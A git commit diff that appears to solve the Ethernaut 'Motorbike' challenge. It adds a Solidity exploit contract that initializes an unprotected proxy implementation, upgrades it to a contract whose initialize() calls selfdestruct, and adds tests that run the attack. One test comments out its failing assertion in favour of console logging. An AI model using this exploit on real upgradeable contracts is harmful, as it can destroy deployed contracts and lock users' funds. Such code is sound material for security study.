7cc7bcf3ac08cba8562e4684e296a33a3e91695f
Sk0g3n <skogen27@protonmail.com>
2022-04-08 22:14:26 +0200

    ku

--- contracts/Hack.sol
+++ contracts/Hack.sol
@@ -2,6 +2,8 @@
 
 pragma solidity <0.7.0;
 
+import "@openzeppelin/contracts/utils/Address.sol";
+
 interface target {
     function initialize() external;
     function upgradeToAndCall(address, bytes memory) external;
@@ -9,6 +11,7 @@ interface target {
 
 contract Hack {
     address logic;
+    bool public result;
 
     constructor(address _logic) public{
         logic = _logic;
@@ -20,5 +23,20 @@ contract Hack {
         require(success, 'initalize call failed');
     }
 
+    function setmaliciousImp() public returns(bool){
+        rek haxor = new rek();
+        (bool success, ) = logic.call(abi.encodeWithSignature("upgradeToAndCall(address, bytes)",
+         address(haxor),
+         abi.encodeWithSignature('initialize()')
+         ));
+        require(success, "hack call failed");
+        return Address.isContract(logic);
+    }
+
 }
 
+contract rek {
+    function initialize() external {
+        selfdestruct(msg.sender);
+    }
+}
--- test/test.js
+++ test/test.js
@@ -1,11 +1,12 @@
-const { web3, assert } = require("hardhat");
+const { web3 } = require("hardhat");
 
 const MotorBikeFactory = artifacts.require('MotorbikeFactory');
 const Motorbike = artifacts.require('Motorbike');
 const Hack = artifacts.require('Hack');
+const Engine = artifacts.require("Engine");
 
 contract('Motorbike', (accounts) => {
-    let motorbikefactory, motorbike, hack, logic, instaAdd;
+    let motorbikefactory, motorbike, hack, logic, instaAdd, engine;
 
     beforeEach(async () => {
         motorbikefactory = await MotorBikeFactory.deployed();
@@ -15,14 +16,23 @@ contract('Motorbike', (accounts) => {
         logic = storageAd.replace('000000000000000000000000',  '');
         hack = await Hack.new(logic);
         motorbike = await Motorbike.at(instaAdd);
+        engine = await Engine.at(logic);
     })
 
     it('testing call initalize', async () => {
+        console.log(await web3.eth.getStorageAt(logic, 0))
         await hack.callinitialize();
-        //next assert is gucci but won't pass bcs im lazy doin padding slicing of the storage slot value
-        assert.equal(await web3.eth.getStorageAt(logic, 0), hack.address);
+        //next assert is gucci but won't pass bcs im lazy 
+        console.log(await web3.eth.getStorageAt(logic, 0))
+        console.log(await engine.upgrader.call());
+
+       // assert.equal(await web3.eth.getStorageAt(logic, 0), hack.address);
     })
 
-    
- 
+    it("testing hack", async () => {
+        await hack.callinitialize();
+        await hack.setmaliciousImp({from: accounts[2], gas: 500000});
+        console.log(await hack.result.call());
+    })
+
 })
